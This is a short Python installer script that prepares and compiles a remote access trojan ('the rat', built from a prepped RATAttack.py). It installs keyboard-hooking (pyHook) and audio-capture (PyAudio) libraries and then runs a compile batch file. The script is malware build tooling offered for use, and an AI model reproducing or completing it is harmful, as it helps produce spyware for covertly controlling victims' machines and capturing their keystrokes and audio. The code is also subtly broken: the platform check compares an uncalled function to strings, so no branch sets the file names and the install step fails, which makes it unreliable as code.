from platform import machine
from os import system as s
input("\nNow going to install dependencies and compile the rat, make sure you have prepped RATAttack.py beforehand\n\n\nPress ENTER to resume")
s('pip install -r requirements.txt')
s('python hashverify.py')
input('\n\nMake sure that the above results are "OK" before continuing')
if machine == '':
    print('\nUnable to determine platform.\n');exit()
elif machine == 'i386':
    fileA = 'PyAudio-0.2.11-cp37-cp37m-win32.whl'
    fileB = 'pyHook-1.5.1-cp37-cp37m-win32.whl'
elif machine == 'amd64':
    fileA = 'PyAudio-0.2.11-cp37-cp37m-win_amd64.whl'
    fileB = 'pyHook-1.5.1-cp37-cp37m-win_amd64.whl'
else:
    print("\n\nYou are probably running a processor like ARM. This isn't supported due to the lack of dependencies supporting ARM.")
s('pip install '+fileA);s('pip install '+fileB)
input('\n\nDid the install run correctly?\n\n\nPress ENTER to build')
s('compile.bat')
input('\n\nScript has finished')